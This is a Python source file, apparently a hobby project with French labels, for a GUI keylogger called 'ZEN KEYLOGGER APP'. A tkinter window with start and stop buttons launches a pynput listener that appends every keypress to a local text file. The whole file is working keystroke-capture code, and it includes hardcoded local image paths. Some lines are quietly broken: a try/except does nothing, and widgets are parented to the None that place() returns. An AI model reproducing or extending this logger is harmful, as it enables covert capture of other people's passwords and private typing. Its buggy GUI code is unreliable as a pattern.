#coding: utf-8

from tkinter import *
from pynput import keyboard
from PIL import Image, ImageTk, ImageFile

# ####declaration variable
size_x = 600
size_y = 400
pos_x = 200
pos_y = 200

geo = "{}x{}+{}+{}".format(size_x, size_y, pos_x, pos_y)


class keylogger():

    def __init__(self, namefile: str="listkey.txt") -> None:


        self.namefile=namefile

    @staticmethod
    def get_char(key):
        try:
            return key
        except AttributeError:
            return str(key)


    def keyboard_touch(self, key):
        print(key)
        with open(self.namefile, 'a') as logs:
            logs.write(self.get_char(str(key)))



    def main_process(self):

        listener = keyboard.Listener(on_press=self.keyboard_touch)
        listener.start()





# ############################
objt_zen = keylogger()


sys_keylogger_app = Tk()
sys_keylogger_app.title("ZEN KEYLOGGER APP")

sys_keylogger_app.geometry(geo)
sys_keylogger_app.resizable(width=FALSE, height=FALSE)



can1 = Canvas(sys_keylogger_app, bg="gray", width=600, height=400).place(x=0, y=0)
can2 = Canvas(can1, bg="black", ).place(x=10,  y=0, height=400, width=430)
l1 = Label(can2, text="KEYLOGGER APPLICATION",bg="aqua", fg="orange", font=("bauhaus 93", 20, "bold")).place(x=30, y=20)
l2 = Label(can2, text="APPUIYER SUR START POUR LANCER",bg="black", fg="white", font=("bauhaus 93", 10, "bold")).place(x=30, y=60)
l3 = Label(can2, text="APPUIYER SUR FIN POUR ARRETER LE PROCESS ET QUITTER",bg="black", fg="white", font=("bauhaus 93", 10, "bold")).place(x=20, y=100)
B_start = Button(can1,command=objt_zen.main_process, text="lancer", bg="black", fg="white", width=15, relief=GROOVE, borderwidth=5).place(x=450, y=10)
B_end = Button(can1,command=sys_keylogger_app.quit, bg="black", text="fin", fg="white", width=15, relief=GROOVE, borderwidth=5).place(x=450, y=200)

img1 = Image.open('C:/Users/Pavillon 15n_266sa/Desktop/PROJET/projet python/project pycharm/key-img1.png')
photo1 = ImageTk.PhotoImage(img1)
can_img1 = Canvas(can2, width=400, height=430)
can_img1.create_image(0, 0, anchor=NW, image=photo1)
can_img1.place(x=20, y=200)

img2 = Image.open('C:/Users/Pavillon 15n_266sa/Desktop/PROJET/projet python/project pycharm/key_img2.png')
photo2 = ImageTk.PhotoImage(img2)
can_img2 = Canvas(can2, width=70, height=70)
can_img2.create_image(0, 0, anchor=NW, image=photo2)
can_img2.place(x=360, y=20)

sys_keylogger_app.mainloop()


